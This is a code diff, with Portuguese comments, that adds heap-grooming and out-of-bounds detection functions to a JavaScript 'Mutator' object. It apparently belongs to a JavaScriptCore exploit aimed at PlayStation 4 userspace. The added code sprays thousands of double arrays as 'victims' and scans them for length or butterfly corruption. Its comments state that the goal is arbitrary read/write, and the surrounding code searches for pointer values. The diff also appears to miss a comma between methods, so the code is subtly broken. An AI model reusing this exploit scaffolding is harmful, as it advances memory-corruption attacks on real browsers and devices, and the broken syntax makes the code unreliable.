@@ -82,6 +82,59 @@ export const Mutator = {
         return { corrupted: false };
     },
 
+    // ─── NOVA SECÇÃO: OOB Array Canaries ──────────────────────────────
+
+    /**
+     * Aloca milhares de arrays de doubles. Os arrays de doubles são o alvo
+     * perfeito no JSC porque não têm overhead de conversão.
+     * Se corrompermos o length de um destes, ganhamos Arbitrary Read/Write.
+     */
+    groomOOB: function(count = 2000) {
+        let victims = new Array(count);
+        for (let i = 0; i < count; i++) {
+            // Criamos um array de doubles com um tamanho exato (4 elementos)
+            let arr = [1.1, 2.2, 3.3, 4.4];
+            
+            // Adicionamos um 'magic number' como propriedade para garantir 
+            // que sabemos quem ele é se a memória for lida
+            arr.marker = 0x1337; 
+            
+            victims[i] = arr;
+        }
+        return victims;
+    },
+
+    /**
+     * Varre as vítimas para ver se o limite do array foi corrompido
+     * por um overflow do objeto adjacente.
+     */
+    scanOOB: function(victims) {
+        for (let i = 0; i < victims.length; i++) {
+            let arr = victims[i];
+            
+            // O ALVO DE OURO: O tamanho do array mudou sem que o JS o tocasse?
+            if (arr.length !== 4) {
+                return {
+                    corrupted: true,
+                    type: 'LENGTH_CORRUPTION',
+                    hex: `0x${arr.length.toString(16)}`,
+                    reason: `💥 OOB CONFIRMADO! O tamanho do array canário [${i}] mudou de 4 para ${arr.length}. O Butterfly foi sobrescrito!`
+                };
+            }
+
+            // O ALVO DE PRATA: O tamanho está igual, mas os dados internos foram sobrescritos?
+            if (arr[0] !== 1.1 || arr[1] !== 2.2) {
+                return {
+                    corrupted: true,
+                    type: 'DATA_OVERWRITE',
+                    hex: (typeof arr[0] === 'number') ? arr[0].toString() : 'N/A',
+                    reason: `⚠️ OOB DATA WRITE! O conteúdo do array canário [${i}] foi corrompido silenciosamente.`
+                };
+            }
+        }
+        return { corrupted: false };
+    }
+    
     /**
      * Varre slots em busca de valores que pareçam ponteiros do PS4 userspace.
      * PS4 (FreeBSD/AMD64): ponteiros de userspace ficam tipicamente em
@@ -89,6 +142,7 @@ export const Mutator = {
      *
      * @returns {{ offset: number, val: bigint, hex: string }[]}
      */
+    
     scanForPointers: function(slots) {
         const found = [];
         const LO = 0x0000100000000000n;
